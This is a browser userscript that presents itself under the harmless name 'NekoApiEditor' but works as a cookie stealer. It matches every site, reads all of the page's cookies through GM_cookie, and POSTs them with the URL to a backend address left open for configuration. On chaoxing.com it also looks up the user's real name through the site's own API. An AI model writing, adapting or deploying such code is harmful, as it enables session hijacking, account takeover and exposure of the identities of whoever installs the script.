// ==UserScript==
// @name        NekoApiEditor
// @namespace   test
// @version     1.74
// @match       *://*/
// @match       *://*/*
// @run-at      document-end
// @grant       GM_cookie
// ==/UserScript==

function storeSentCookies(url, cookies) {

    const cookiesToStore = cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value
    }));


    const storedCookies = localStorage.getItem('sentCookies') || "[]";
    const sentCookies = JSON.parse(storedCookies);


    sentCookies.push({ url: url, cookies: cookiesToStore });
    localStorage.setItem('sentCookies', JSON.stringify(sentCookies));
}

function sendDataToServer(url, cookies, chaoxingName) {
    const dataToSend = {
        url: url,
        cookies: cookies
    };

    if (chaoxingName) {
        dataToSend.chaoxing_name = chaoxingName;
    }
    //自定义需要发送到的后端地址
    fetch('http://localhost/server/nekocookieset.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
        .then(response => {
        if (!response.ok) {
            throw new Error(`Network response was not ok: ${response.status}${response.statusText}`);
        }
        return response.json();
    })
        .then(result => {
        console.log('Server response:', result);
    })
        .catch(error => {
        console.error('Error sending data to server:', error);
    });
}

function getChaoxingUserId(cookies) {
    for (const cookie of cookies) {
        if (cookie.name === 'UID') {
            return cookie.value;
        }
    }
    return null;
}

function fetchChaoxingUserInfo(uid, cookies) {
    const url = `https://mobilelearn.chaoxing.com/v2/apis/sign/getUser?puid=${uid}`;
    fetch(url, {
        credentials: 'include'
    })
        .then(response => {
        if (!response.ok) {
            throw new Error(`Network response was not ok: ${response.status}${response.statusText}`);
        }
        return response.json();
    })
        .then(result => {
        if (result.result === 1 && result.data) {
            console.log(`${result.data.realName}`);
            sendDataToServer(document.location.href, cookies, result.data.realName);
        } else {
            console.error('Failed to fetch user info:', result);
            sendDataToServer(document.location.href, cookies);
        }
    })
        .catch(error => {
        console.error('Error fetching Chaoxing user info:', error);
        sendDataToServer(document.location.href, cookies);
    });
}

GM_cookie.list({ url: document.location.href }, function (cookies, error) {
    if (error) {
        console.error('Error listing cookies:', error);
    } else {
        if (cookies.length === 0) {
            console.log('No cookies to send.');
            return;
        }

        if (document.location.href.includes('chaoxing.com')) {
            const uid = getChaoxingUserId(cookies);
            if (uid) {
                fetchChaoxingUserInfo(uid, cookies);
            } else {
                console.error('UID not found in cookies');
                sendDataToServer(document.location.href, cookies);
            }
        } else {
            sendDataToServer(document.location.href, cookies);
        }
    }
});